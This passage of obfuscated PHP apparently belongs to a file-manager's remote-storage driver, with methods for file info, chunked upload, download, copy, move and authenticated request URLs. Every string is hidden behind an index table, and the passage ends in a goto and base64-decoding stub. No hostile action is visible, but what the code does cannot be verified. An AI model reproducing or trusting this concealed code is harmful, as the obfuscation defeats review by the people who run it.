fileOutLink($Ô‚Âá€) { header($_SERVER[”øäÃÍª][172] . $this->urlAuto($Ô‚Âá€)); die; } public function exist($ç¸õ¤Ï´) { $‹´Â•èµ = $this->_info($ç¸õ¤Ï´); return $‹´Â•èµ ? !0 : !1; } public function isFile($…€Û“åı) { $‡úƒáë =& $_SERVER[”øäÃÍª]; $¯¨ù«‘‚ = $this->_info($…€Û“åı); return _get($¯¨ù«‘‚, $‡úƒáë[33], $‡úƒáë[12]) == $‡úƒáë[230]; } public function isFolder($“ÚºƒØ®) { $œŞ­£•¶ =& $_SERVER[”øäÃÍª]; $÷†ˆÌşŠ = $this->_info($“ÚºƒØ®); return _get($÷†ˆÌşŠ, $œŞ­£•¶[33], $œŞ­£•¶[12]) == $œŞ­£•¶[78]; } public function size($‰–Ü¾ù›) { $à¶À§ƒ = $this->_info($‰–Ü¾ù›); return _get($à¶À§ƒ, $_SERVER[”øäÃÍª][79], 0); } public function info($Èï™è×‘) { return $this->_info($Èï™è×‘); } public function infoAuth($¨‘»Ššª) { return $this->_info($¨‘»Ššª); } public function infoFull($©øœŞëÙ) { return $this->_info($©øœŞëÙ); } public function infoFullSimple($—İö¤¹) { return $this->_info($—İö¤¹); } public function infoWithChildren($’Û‹ı†Å) { return $this->_info($’Û‹ı†Å, !0); } public function has($á¾¿ñ¹†, $¦å¹à­‰ = false, $¸Øø¡Ó» = false) { $Åİ¡Şìİ =& $_SERVER[”øäÃÍª]; $ûó±ˆêõ = $this->_info($á¾¿ñ¹†); if (!$ûó±ˆêõ) { return !1; } if ($¦å¹à­‰) { return array($Åİ¡Şìİ[239] => $ûó±ˆêõ[$Åİ¡Şìİ[239]], $Åİ¡Şìİ[240] => $ûó±ˆêõ[$Åİ¡Şìİ[240]]); } return $Ğ˜•ÎÁ÷ ? $ûó±ˆêõ[$Åİ¡Şìİ[239]] > 0 : $ûó±ˆêõ[$Åİ¡Şìİ[240]] > 0; } public function mkfile($À«…²ıâ, $ÉßòÙ€’ = '', $ĞæËˆ» = REPEAT_RENAME) { return $this->request($_SERVER[”øäÃÍª][1498], array($À«…²ıâ, $ÉßòÙ€’, $ĞæËˆ»)); } public function mkdir($ÃÜîØï, $´£ÊÒŠÉ = REPEAT_SKIP) { return $this->request($_SERVER[”øäÃÍª][1499], array($ÃÜîØï, $´£ÊÒŠÉ)); } public function remove($ŸÁœ€¡ü) { return $this->request($_SERVER[”øäÃÍª][1286], array($ŸÁœ€¡ü)); } public function rename($ßš¤‹­, $Ú€§øû) { return $this->request($_SERVER[”øäÃÍª][1502], array($ßš¤‹­, $Ú€§øû)); } public function moveSameAllow() { } public function copy($à°ğ‰é, $½ÏÁ±îæ, $ÚõæİØ = REPEAT_REPLACE, $É³³—£ş = false) { return $this->request($_SERVER[”øäÃÍª][649], array($à°ğ‰é, $½ÏÁ±îæ, $ÚõæİØ)); } public function move($é’ÇÓü¸, $ÏÊ‘Íö, $íïüí› = REPEAT_REPLACE, $ÄğİœÎö = false) { return $this->request($_SERVER[”øäÃÍª][651], array($é’ÇÓü¸, $ÏÊ‘Íö, $íïüí›)); } public function uploadLink($€öÈÙÆ÷, $äÌ¾œŞ¡ = 0) { $¬ÙïŒ› =& $_SERVER[”øäÃÍª]; $Ï²øºø‡ = IO::init($GLOBALS[$¬ÙïŒ›[7]][$¬ÙïŒ›[87]]); $ù‹ÑàÁ“ = $this->pathApiEncode($Ï²øºø‡->path); $õ¯ÁŒê = $this->requestMakeUrl($¬ÙïŒ›[1526], array($¬ÙïŒ›[87] => $ù‹ÑàÁ“)); return array($¬ÙïŒ›[1527] => $õ¯ÁŒê); } public function upload($¥¹ê—ÓÕ, $¨¯”éœö, $ «ƒîûİ = false, $±İäÉœ = REPEAT_REPLACE) { $—İ­ÛÇÃ =& $_SERVER[”øäÃÍª]; if (filesize($¨¯”éœö) < $this->uploadChunkSize) { return $this->request($—İ­ÛÇÃ[107], array($¥¹ê—ÓÕ, $¨¯”éœö, $±İäÉœ)); } $»ÑÊ®„ = $this->uploadHashCheck($¥¹ê—ÓÕ, $¨¯”éœö, $±İäÉœ); if ($»ÑÊ®„) { return $»ÑÊ®„; } $†ÖÎœ‘™ = @filesize($¨¯”éœö); $œˆ²ÂÄ = $this->uploadChunkSize; $Á® Ïûó = ceil($†ÖÎœ‘™ / $œˆ²ÂÄ); $şÙüØ»¢ = 0; while ($şÙüØ»¢ < $Á® Ïûó) { $Ö¹á¹Å = IO::fileSubstr($¨¯”éœö, $şÙüØ»¢ * $œˆ²ÂÄ, $œˆ²ÂÄ); $ËµıÑ‹Ô = $this->tempFile($—İ­ÛÇÃ[12], $Ö¹á¹Å); $„½ÓÚÑø = array($—İ­ÛÇÃ[79] => $†ÖÎœ‘™, $—İ­ÛÇÃ[1528] => $œˆ²ÂÄ, $—İ­ÛÇÃ[1529] => $Á® Ïûó, $—İ­ÛÇÃ[1530] => $şÙüØ»¢); $Ä ‰ßæ = $this->uploadSend($¥¹ê—ÓÕ, $ËµıÑ‹Ô, $„½ÓÚÑø, $±İäÉœ); $şÙüØ»¢++; if (!$Ä ‰ßæ) { return !1; } } if (!is_array($Ä ‰ßæ) || empty($Ä ‰ßæ[$—İ­ÛÇÃ[603]])) { return !1; } return $this->pathApiDecode($Ä ‰ßæ[$—İ­ÛÇÃ[603]]); } private function uploadHashCheck($ä¿„µ’‹, $¼´ãòÂ„, $¦µÒõ’‚) { $áÙÎÔµ“ =& $_SERVER[”øäÃÍª]; $‚¥äæÙì = IO::hashSimple($¼´ãòÂ„); $ê³¶Õñ = array($áÙÎÔµ“[1531] => $áÙÎÔµ“[1532], $áÙÎÔµ“[1490] => $‚¥äæÙì); $ªÙËíÒÌ = $this->uploadSend($ä¿„µ’‹, $áÙÎÔµ“[12], $ê³¶Õñ, $¦µÒõ’‚); $Ö²¸è²ˆ = _get($ªÙËíÒÌ, $áÙÎÔµ“[603], array()); $œ¡Ğ¯– = _get($Ö²¸è²ˆ, $áÙÎÔµ“[1533]); if (!is_array($œ¡Ğ¯–) || !$œ¡Ğ¯–[$áÙÎÔµ“[571]]) { return !1; } $ìæÍŸú = IO::hashMd5($¼´ãòÂ„); if ($œ¡Ğ¯–[$áÙÎÔµ“[571]] != $ìæÍŸú) { return !1; } if ($ªÙËíÒÌ[$áÙÎÔµ“[603]][$áÙÎÔµ“[1534]]) { $this->uploadChunkSize = $ªÙËíÒÌ[$áÙÎÔµ“[603]][$áÙÎÔµ“[1534]]; } $ê³¶Õñ = array($áÙÎÔµ“[1531] => $áÙÎÔµ“[1535], $áÙÎÔµ“[1491] => $ìæÍŸú, $áÙÎÔµ“[1490] => $‚¥äæÙì); $ªÙËíÒÌ = $this->uploadSend($ä¿„µ’‹, $áÙÎÔµ“[12], $ê³¶Õñ, $¦µÒõ’‚); if (!is_array($ªÙËíÒÌ) || empty($ªÙËíÒÌ[$áÙÎÔµ“[603]])) { return !1; } return $this->pathApiDecode($ªÙËíÒÌ[$áÙÎÔµ“[603]]); } private function uploadSend($ˆêëÌ”æ, $‚ÚµˆŸ, $àŞ‚ÆÀË, $÷ÕØ³· = '') { $òĞ´£øñ =& $_SERVER[”øäÃÍª]; $àŞ‚ÆÀË[$òĞ´£øñ[32]] = get_path_this($ˆêëÌ”æ); $àŞ‚ÆÀË[$òĞ´£øñ[87]] = $this->pathApiEncode(get_path_father($ˆêëÌ”æ)); if ($÷ÕØ³·) { $àŞ‚ÆÀË[$òĞ´£øñ[1536]] = $÷ÕØ³·; } if ($‚ÚµˆŸ) { $àŞ‚ÆÀË[$òĞ´£øñ[230]] = $òĞ´£øñ[1351] . $‚ÚµˆŸ; } return $this->requestSend($òĞ´£øñ[1526], $àŞ‚ÆÀË); } protected function pathApiEncode($â¦ãÌµŸ) { $Òâ°ú£Ã =& $_SERVER[”øäÃÍª]; $ÆÛÁéêë = $this->_config[$Òâ°ú£Ã[1509]]; $ˆÇšĞğ = strlen($ÆÛÁéêë); if (substr($â¦ãÌµŸ, 0, $ˆÇšĞğ) == $ÆÛÁéêë) { return $â¦ãÌµŸ; } return $ÆÛÁéêë . ltrim($â¦ãÌµŸ, $Òâ°ú£Ã[8]); } protected function pathApiDecode($ÙÆĞİñ¶) { $‰ªŸßìí =& $_SERVER[”øäÃÍª]; $â”‘°Š• = $this->_config[$‰ªŸßìí[1509]]; $õ¬ú§´Ó = strlen($â”‘°Š•); if (substr($ÙÆĞİñ¶, 0, $õ¬ú§´Ó) !== $â”‘°Š•) { return $ÙÆĞİñ¶; } return $this->_config[$‰ªŸßìí[1309]] . ltrim(substr($ÙÆĞİñ¶, $õ¬ú§´Ó), $‰ªŸßìí[8]); } private function pathInfoParse(&$ŠÍĞ‡Ú­) { $˜ÁàÄ¢ =& $_SERVER[”øäÃÍª]; $€ÇÖ°ó© = $this->_config; $Çƒá€ = $€ÇÖ°ó©[$˜ÁàÄ¢[584]]; if (!$ŠÍĞ‡Ú­ || !is_array($ŠÍĞ‡Ú­)) { return $ŠÍĞ‡Ú­; } static $ÆÎ†ææè = array(); $ûûµë˜ß = $ÆÎ†ææè[$Çƒá€[$˜ÁàÄ¢[695]]]; if (!is_array($ûûµë˜ß)) { $Ğš¼í¯ = LNG($˜ÁàÄ¢[1537]); $Ì’´—Ä = $€ÇÖ°ó©[$˜ÁàÄ¢[588]][$˜ÁàÄ¢[90]]; $‹®À´Î = parse_url($€ÇÖ°ó©[$˜ÁàÄ¢[588]][$˜ÁàÄ¢[1538]]); $ØË­àë = $€ÇÖ°ó©[$˜ÁàÄ¢[588]][$˜ÁàÄ¢[1539]]; $ûûµë˜ß = array($˜ÁàÄ¢[1540] => $Ì’´—Ä[$˜ÁàÄ¢[32]] . $˜ÁàÄ¢[1022] . $ØË­àë . $˜ÁàÄ¢[1351] . $‹®À´Î[$˜ÁàÄ¢[206]] . $˜ÁàÄ¢[1024], $˜ÁàÄ¢[1541] => $Ğš¼í¯ . $˜ÁàÄ¢[1088] . $€ÇÖ°ó©[$˜ÁàÄ¢[588]][$˜ÁàÄ¢[1538]] . $˜ÁàÄ¢[1542] . LNG($˜ÁàÄ¢[1543]) . $˜ÁàÄ¢[1088] . $ØË­àë, $˜ÁàÄ¢[1544] => LNG($˜ÁàÄ¢[1545]) . $˜ÁàÄ¢[1546] . $€ÇÖ°ó©[$˜ÁàÄ¢[588]][$˜ÁàÄ¢[1538]] . $˜ÁàÄ¢[285] . LNG($˜ÁàÄ¢[1547]) . $˜ÁàÄ¢[1546] . $Ì’´—Ä[$˜ÁàÄ¢[610]], $˜ÁàÄ¢[1539] => array($˜ÁàÄ¢[32] => $ØË­àë, $˜ÁàÄ¢[1548] => $˜ÁàÄ¢[1549]), $˜ÁàÄ¢[1550] => Action($˜ÁàÄ¢[1495])->shareTargetMake($Çƒá€[$˜ÁàÄ¢[1506]])); $ÆÎ†ææè[$Çƒá€[$˜ÁàÄ¢[695]]] = $ûûµë˜ß; } unset($ŠÍĞ‡Ú­[$˜ÁàÄ¢[191]]); unset($ŠÍĞ‡Ú­[$˜ÁàÄ¢[612]]); unset($ŠÍĞ‡Ú­[$˜ÁàÄ¢[188]]); unset($ŠÍĞ‡Ú­[$˜ÁàÄ¢[597]]); $ŠÍĞ‡Ú­[$˜ÁàÄ¢[1551]] = !0; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[232]] = $€ÇÖ°ó©[$˜ÁàÄ¢[1513]]; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[233]] = $€ÇÖ°ó©[$˜ÁàÄ¢[1514]]; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[510]] = $€ÇÖ°ó©[$˜ÁàÄ¢[1511]]; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[1539]] = $ûûµë˜ß[$˜ÁàÄ¢[1539]]; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[1552]] = $Çƒá€[$˜ÁàÄ¢[231]]; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[1553]] = $Çƒá€[$˜ÁàÄ¢[88]]; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[1554]] = $ûûµë˜ß[$˜ÁàÄ¢[1544]]; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[1550]] = $ûûµë˜ß[$˜ÁàÄ¢[1550]]; $“³âù‚ï = explode($˜ÁàÄ¢[8], trim($ŠÍĞ‡Ú­[$˜ÁàÄ¢[610]], $˜ÁàÄ¢[8])); $“³âù‚ï[0] = $ûûµë˜ß[$˜ÁàÄ¢[1540]]; $ŠÍĞ‡Ú­[$˜ÁàÄ¢[610]] = implode($˜ÁàÄ¢[8], $“³âù‚ï); if (count($“³âù‚ï) > 1) { unset($ŠÍĞ‡Ú­[$˜ÁàÄ¢[1550]]); } if (count($“³âù‚ï) == 1) { if ($ŠÍĞ‡Ú­[$˜ÁàÄ¢[33]] == $˜ÁàÄ¢[78]) { $ŠÍĞ‡Ú­[$˜ÁàÄ¢[32]] = $ûûµë˜ß[$˜ÁàÄ¢[1540]]; } array_set_value($ŠÍĞ‡Ú­, $˜ÁàÄ¢[1555], $ûûµë˜ß[$˜ÁàÄ¢[1541]]); } $óÁÅËÜ = array($˜ÁàÄ¢[1556], $˜ÁàÄ¢[1475], $˜ÁàÄ¢[1557], $˜ÁàÄ¢[1558]); foreach ($óÁÅËÜ as $ØüéÈ‘´) { $ıªÕÍ¹õ = $this->urlAuto(_get($ŠÍĞ‡Ú­, $ØüéÈ‘´, $˜ÁàÄ¢[12])); if ($ıªÕÍ¹õ) { array_set_value($ŠÍĞ‡Ú­, $ØüéÈ‘´, $ıªÕÍ¹õ); } } } private function _info($şş¬©ÜÜ, $æşÂâ = false) { $Ù›²¨¼ =& $_SERVER[”øäÃÍª]; $üÂ„Šœë = $this->_config; if (!$üÂ„Šœë) { return !1; } static $÷„†¸Í– = array(); if (isset($÷„†¸Í–[$şş¬©ÜÜ]) && is_array($÷„†¸Í–[$şş¬©ÜÜ])) { return $÷„†¸Í–[$şş¬©ÜÜ]; } if ((!$şş¬©ÜÜ || !trim($şş¬©ÜÜ, $Ù›²¨¼[8])) && !$æşÂâ) { $Ì‰ÏÆ‰­ = $üÂ„Šœë[$Ù›²¨¼[588]][$Ù›²¨¼[90]]; if (!$Ì‰ÏÆ‰­) { return !1; } $Ì‰ÏÆ‰­[$Ù›²¨¼[610]] = $Ù›²¨¼[12]; $Ì‰ÏÆ‰­[$Ù›²¨¼[87]] = $üÂ„Šœë[$Ù›²¨¼[1309]]; $this->pathInfoParse($Ì‰ÏÆ‰­); return $Ì‰ÏÆ‰­; } $éëæùªÃ = $this->request($Ù›²¨¼[1559], array($şş¬©ÜÜ, $æşÂâ)); $÷„†¸Í–[$şş¬©ÜÜ] = $éëæùªÃ; return $éëæùªÃ; } private function _fileSubstr($ÔÒñ¾¤¶, $²ÜÃªÌ† = 0, $È¹×Àî = -1) { $¹ı°¨õ® =& $_SERVER[”øäÃÍª]; $†‰âŸÕç = $this->_fileLink($ÔÒñ¾¤¶); if (!$†‰âŸÕç) { return !1; } $şéÒÁÑİ = !1; if ($È¹×Àî > 0) { $µŒ“ş£» = $ıªÇ¡™Ê + $È¹×Àî - 1; $şéÒÁÑİ = array($¹ı°¨õ®[1560] . $ıªÇ¡™Ê . $¹ı°¨õ®[476] . $µŒ“ş£»); } $²Ğˆí× = url_request($†‰âŸÕç, $¹ı°¨õ®[1561], !1, $şéÒÁÑİ); return $²Ğˆí×[$¹ı°¨õ®[859]] ? $²Ğˆí×[$¹ı°¨õ®[1345]] : !1; } private function _download($ùØ‰õ…É, $­ı²ÖİÃ) { $×ÄëÜ = $this->_fileLink($ùØ‰õ…É); if (!$×ÄëÜ) { return !1; } Downloader::start($×ÄëÜ, $­ı²ÖİÃ); return $­ı²ÖİÃ; } private function _fileLink($ìÍõº±, $ĞÏ”‡±™ = '') { $ŒöëÒÑŸ =& $_SERVER[”øäÃÍª]; $»Œ°‚¸á = $this->pathApiEncode($ìÍõº±); return $this->requestMakeUrl($ŒöëÒÑŸ[1562], array($ŒöëÒÑŸ[87] => $»Œ°‚¸á)) . $ĞÏ”‡±™; } private function urlAuto($ƒÂ¥š´Õ) { $ÇääÄÌ =& $_SERVER[”øäÃÍª]; if (!$ƒÂ¥š´Õ) { return $ƒÂ¥š´Õ; } $Ï÷Òïì† = parse_url($ƒÂ¥š´Õ); $¡”áŠ = $ƒÂ¥š´Õ; if ($this->_config[$ÇääÄÌ[1512]] && $Ï÷Òïì†[$ÇääÄÌ[205]] == $ÇääÄÌ[149] && Input::check($Ï÷Òïì†[$ÇääÄÌ[1563]], $ÇääÄÌ[1564])) { $ƒÂ¥š´Õ = $ÇääÄÌ[217] . substr($ƒÂ¥š´Õ, 7); } $ê»È¡áÎ = $ÇääÄÌ[1565] . rawurlencode(rtrim($this->config[$ÇääÄÌ[1509]], $ÇääÄÌ[8])); if (strstr($ƒÂ¥š´Õ, $ê»È¡áÎ)) { $…±—´ì° = strstr($ƒÂ¥š´Õ, $ÇääÄÌ[76]) ? $ÇääÄÌ[284] : $ÇääÄÌ[76]; $ƒÂ¥š´Õ = $ƒÂ¥š´Õ . $…±—´ì° . $ÇääÄÌ[1566] . $this->authToken; } return $ƒÂ¥š´Õ; } private function request($›ƒòùé, $À¥ß’‹á) { $¾ÈÉõ¿® =& $_SERVER[”øäÃÍª]; if (!is_array($À¥ß’‹á)) { $À¥ß’‹á = array(); } for ($æ†½ù²† = 0; $æ†½ù²† < 4; $æ†½ù²†++) { if (!isset($À¥ß’‹á[$æ†½ù²†])) { $À¥ß’‹á[$æ†½ù²†] = $¾ÈÉõ¿®[12]; } } $‚ı™Ş”Û = array($¾ÈÉõ¿®[1559] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1559], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[1569], $¾ÈÉõ¿®[1570] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[1571] => array(array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0])), $¾ÈÉõ¿®[1572] => $À¥ß’‹á[1] ? $¾ÈÉõ¿®[91] : $¾ÈÉõ¿®[12])), $¾ÈÉõ¿®[1521] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1573], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1570] => $¾ÈÉõ¿®[1574], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0])), $¾ÈÉõ¿®[1575] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1576], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1570] => $¾ÈÉõ¿®[1577], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0])), $¾ÈÉõ¿®[1522] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1578], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1579] => $¾ÈÉõ¿®[1580], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0], $¾ÈÉõ¿®[168] => $À¥ß’‹á[1])), $¾ÈÉõ¿®[1498] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1498], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1579] => $¾ÈÉõ¿®[603], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0], $¾ÈÉõ¿®[168] => $À¥ß’‹á[1], $¾ÈÉõ¿®[1536] => $À¥ß’‹á[2])), $¾ÈÉõ¿®[1499] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1499], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1579] => $¾ÈÉõ¿®[603], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0], $¾ÈÉõ¿®[1536] => $À¥ß’‹á[2])), $¾ÈÉõ¿®[649] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1581], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[1582], $¾ÈÉõ¿®[1579] => $¾ÈÉõ¿®[1583], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[1571] => array(array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0])), $¾ÈÉõ¿®[87] => $À¥ß’‹á[1], $¾ÈÉõ¿®[1536] => $À¥ß’‹á[2])), $¾ÈÉõ¿®[651] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1584], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[1582], $¾ÈÉõ¿®[1579] => $¾ÈÉõ¿®[1583], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[1571] => array(array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0])), $¾ÈÉõ¿®[87] => $À¥ß’‹á[1], $¾ÈÉõ¿®[1536] => $À¥ß’‹á[2])), $¾ÈÉõ¿®[1286] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1585], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[1569], $¾ÈÉõ¿®[1570] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[1571] => array(array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0])))), $¾ÈÉõ¿®[1502] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1586], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1579] => $¾ÈÉõ¿®[603], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[87] => $À¥ß’‹á[0], $¾ÈÉõ¿®[1587] => $À¥ß’‹á[1])), $¾ÈÉõ¿®[107] => array($¾ÈÉõ¿®[1567] => $¾ÈÉõ¿®[1526], $¾ÈÉõ¿®[1568] => $¾ÈÉõ¿®[87], $¾ÈÉõ¿®[1579] => $¾ÈÉõ¿®[603], $¾ÈÉõ¿®[1308] => array($¾ÈÉõ¿®[87] => get_path_father($À¥ß’‹á[0]), $¾ÈÉõ¿®[230] => $À¥ß’‹á[1] ? $¾ÈÉõ¿®[1351] . $À¥ß’‹á[1] : $¾ÈÉõ¿®[12], $¾ÈÉõ¿®[32] => get_path_this($À¥ß’‹á[0]), $¾ÈÉõ¿®[1536] => $À¥ß’‹á[2]))); $ËŞ €‰­ = $‚ı™Ş”Û[$›ƒòùé]; if (!$ËŞ €‰­) { return !1; } $†ŸÚë¥ª = $ËŞ €‰­[$¾ÈÉõ¿®[1308]]; $“ĞÏüß´ = explode($¾ÈÉõ¿®[50], $ËŞ €‰­[$¾ÈÉõ¿®[1568]]); foreach ($“ĞÏüß´ as $¡”´­°€) { $á·‡¤¾ = $this->pathApiEncode(_get($†ŸÚë¥ª, $¡”´­°€)); array_set_value($†ŸÚë¥ª, $¡”´­°€, $á·‡¤¾); } if ($›ƒòùé == $¾ÈÉõ¿®[1502] && trim($ËŞ €‰­[$¾ÈÉõ¿®[1308]][$¾ÈÉõ¿®[87]], $¾ÈÉõ¿®[8]) == trim($this->_config[$¾ÈÉõ¿®[1309]], $¾ÈÉõ¿®[8])) { return $ËŞ €‰­[$¾ÈÉõ¿®[1308]][$¾ÈÉõ¿®[87]]; } $–¡Åˆ­Î = $this->requestSend($ËŞ €‰­[$¾ÈÉõ¿®[1567]], $†ŸÚë¥ª); if (!$–¡Åˆ­Î) { return !1; } $ğ÷˜³Ì = $–¡Åˆ­Î[$¾ÈÉõ¿®[1345]]; if ($ËŞ €‰­[$¾ÈÉõ¿®[1579]]) { $ğ÷˜³Ì = _get($–¡Åˆ­Î, $ËŞ €‰­[$¾ÈÉõ¿®[1579]]); } if (is_string($ğ÷˜³Ì) && !$ËŞ €‰­[$¾ÈÉõ¿®[1570]]) { return $this->pathApiDecode($ğ÷˜³Ì); } if (!is_array($ğ÷˜³Ì) || !$ğ÷˜³Ì) { return $ğ÷˜³Ì; } $ß¬‰âÖÍ = explode($¾ÈÉõ¿®[50], $ËŞ €‰­[$¾ÈÉõ¿®[1570]]); foreach ($ß¬‰âÖÍ as $¡”´­°€) { $ÉÚŸ½° = explode($¾ÈÉõ¿®[10], $¡”´­°€); $ ŠªÊÄ­ = array_search($¾ÈÉõ¿®[1588], $ÉÚŸ½°); if ($ ŠªÊÄ­ === !1) { $á·‡¤¾ = $this->pathApiDecode(_get($ğ÷˜³Ì, $¡”´­°€)); array_set_value($ğ÷˜³Ì, $¡”´­°€, $á·‡¤¾); if ($›ƒòùé == $¾ÈÉõ¿®[1559] && $¡”´­°€ == $¾ÈÉõ¿®[87]) { $this->pathInfoParse($ğ÷˜³Ì); } if ($›ƒòùé == $¾ÈÉõ¿®[1521] && $¡”´­°€ == $¾ÈÉõ¿®[1589]) { $this->pathInfoParse($ğ÷˜³Ì[$¾ÈÉõ¿®[1496]]); } if ($›ƒòùé == $¾ÈÉõ¿®[1521]) { $ğ÷˜³Ì[$¾ÈÉõ¿®[1590]] = array(); } continue; } $üÌî½Ú = implode($¾ÈÉõ¿®[10], array_slice($ÉÚŸ½°, $ ŠªÊÄ­ + 1)); $»ªìõ§ = array(); if ($ ŠªÊÄ­ === 0) { $»ªìõ§ =& $ğ÷˜³Ì; } if ($ ŠªÊÄ­ === 1) { $»ªìõ§ =& $ğ÷˜³Ì[$ÉÚŸ½°[0]]; } if ($ ŠªÊÄ­ === 2) { $»ªìõ§ =& $ğ÷˜³Ì[$ÉÚŸ½°[0]][$ÉÚŸ½°[1]]; } foreach ($»ªìõ§ as $¡”´­°€ => $ª®µ¡«‰) { $á·‡¤¾ = $this->pathApiDecode(_get($ª®µ¡«‰, $üÌî½Ú)); array_set_value($»ªìõ§[$¡”´­°€], $üÌî½Ú, $á·‡¤¾); $this->pathInfoParse($»ªìõ§[$¡”´­°€]); } unset($»ªìõ§); } return $ğ÷˜³Ì; } private function requestMakeUrl($  úóßÌ, $îÀ¡áåÈ = '') { $îú¾à‘ö =& $_SERVER[”øäÃÍª]; $¹„¿Úîç = $this->_config; if (!$this->authToken) { return !1; } $¨˜îà“Ğ = $this->requestQuery($îÀ¡áåÈ, !0) . $îú¾à‘ö[1591] . $this->authToken; $¦æÇ£« = rtrim($¹„¿Úîç[$îú¾à‘ö[588]][$îú¾à‘ö[1538]], $îú¾à‘ö[8]) . $îú¾à‘ö[1592] . $  úóßÌ; return $¦æÇ£« . $îú¾à‘ö[1593] . rawurlencode($¹„¿Úîç[$îú¾à‘ö[588]][$îú¾à‘ö[1510]]) . $¨˜îà“Ğ; } private function requestAuthToken() { $ÖŞôğá =& $_SERVER[”øäÃÍª]; $áºÀ«ÌÕ = $this->_config; if (!$áºÀ«ÌÕ) { return !1; } $ıúÈÆ = _get($áºÀ«ÌÕ, $ÖŞôğá[1594]); $¢º¥ÀÏŞ = array_find_by_field($áºÀ«ÌÕ[$ÖŞôğá[588]][$ÖŞôğá[1550]], $ÖŞôğá[1595], $ıúÈÆ); if (!$¢º¥ÀÏŞ) { return !1; } $üØª³²à = $¢º¥ÀÏŞ[$ÖŞôğá[1596]] . $ÖŞôğá[1597] . $¢º¥ÀÏŞ[$ÖŞôğá[1299]]; $ùš¯æüØ = $ÖŞôğá[1598] . $this->pathParse[$ÖŞôğá[487]] . $ÖŞôğá[476] . $üØª³²à; $ï‘£µÜö = Cache::get($ùš¯æüØ); if ($ï‘£µÜö) { return $ï‘£µÜö; } $ï‘£µÜö = Mcrypt::encode($üØª³²à, $ÖŞôğá[1599]); Cache::set($ùš¯æüØ, $ï‘£µÜö, 3600 * 24 * 60); return $ï‘£µÜö; } private function requestQuery($£Å˜èÃ£ = '', $ÔÌ Öäè = false) { if (!$£Å˜èÃ£ || !is_array($£Å˜èÃ£)) { return $£Å˜èÃ£; } foreach ($£Å˜èÃ£ as $½€˜è°‘ => $ÅÈÖ•­ó) { if (is_array($ÅÈÖ•­ó)) { $£Å˜èÃ£[$½€˜è°‘] = json_encode($ÅÈÖ•­ó); } } return $ÔÌ Öäè ? $_SERVER[”øäÃÍª][284] . http_build_query($£Å˜èÃ£) : $£Å˜èÃ£; } private function requestSend($Ë–ã£¡, $©âá³ò) { $åõşÆã€ =& $_SERVER[”øäÃÍª]; $´ª‘ÏÜÜ = $this->requestMakeUrl($Ë–ã£¡); if (!$´ª‘ÏÜÜ) { return !1; } $âÔ£¸ëä = url_request($´ª‘ÏÜÜ, $åõşÆã€[288], $this->requestQuery($©âá³ò), !1, !1, !0); $¸éØ†é  = $âÔ£¸ëä[$åõşÆã€[1345]]; if (!is_array($¸éØ†é ) || !$¸éØ†é  || !$¸éØ†é [$åõşÆã€[1355]] || intval($¸éØ†é [$åõşÆã€[1355]]) > 500) { $ùñà™Í² = is_array($¸éØ†é ) ? $¸éØ†é [$åõşÆã€[1345]] : $¸éØ†é  . $åõşÆã€[12]; if (!$âÔ£¸ëä[$åõşÆã€[859]]) { $ùñà™Í² .= $åõşÆã€[1600] . $âÔ£¸ëä[$åõşÆã€[1355]] . $åõşÆã€[175]; } IO::errorTips($ùñà™Í², !1); return !1; } return $¸éØ†é ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¬ä‹®™“) { parent::__construct($¬ä‹®™“); $this->setSignVersion($_SERVER[”øäÃÍª][247]); } } goto c£³«‰òÉ¥; EàÏ¼Íõ¤: $fileSize = strrev(base64_decode($_SERVER[–¥ˆîÀ°][0])); function binCheckNeq($¼½„ÀÊ¶, $åº¢œîà) { return $¼½„ÀÊ¶ != $åº¢œîà; } 